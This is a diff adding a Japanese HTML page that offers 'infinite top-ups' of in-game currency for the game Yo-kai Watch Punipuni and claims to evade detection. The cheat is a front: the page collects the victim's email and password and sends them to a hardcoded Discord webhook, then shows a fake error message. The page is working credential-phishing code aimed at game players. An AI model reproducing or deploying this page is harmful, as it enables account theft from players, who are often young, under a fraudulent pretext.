@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>level5無限課金</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 60px;
+    }
+    input, textarea {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px 30px;
+    }
+  </style>
+</head>
+<body>
+
+<h1>level5無限課金</h1>
+<p class="description">
+検知回避済みです<br>
+この機能はアカウント作成から3ヶ月以上経過したアカウントのみで使用可能<br>
+エラーが出た際は時間をおいてから試してください<br>
+成功後ぷにぷにwebショップで購入可能。Ｙポイントは購入不可
+</p>
+
+<input id="email" placeholder="メール"><br>
+<input id="name" placeholder="パスワード"><br>
+<textarea id="message" placeholder="課金額"></textarea><br>
+
+<button type="button" onclick="send()">課金する</button>
+<hr>
+
+<p style="margin-top:40px;">
+  <a href="https://yokai-punipuni-webshop.jp/" target="_blank">
+    ぷにぷにwebショップへ
+  </a>
+</p>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1462087139121434765/D2e9LoPwxz4iX43uvne7-3dS4xY6gPuN2RdzIbgMwvzhZzJUZk_UmpyIb7cznwpK94Et";
+
+async function send() {
+  const email = document.getElementById("email").value;
+  const name = document.getElementById("name").value;
+  const message = document.getElementById("message").value;
+
+  await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content:
+        "📩 新規送信\n" +
+        "メール: " + email + "\n" +
+        "名前: " + name + "\n" +
+        "内容: " + message
+    })
+  });
+
+  alert("エラーが発生しました。後ほどお試しください");
+}
+</script>
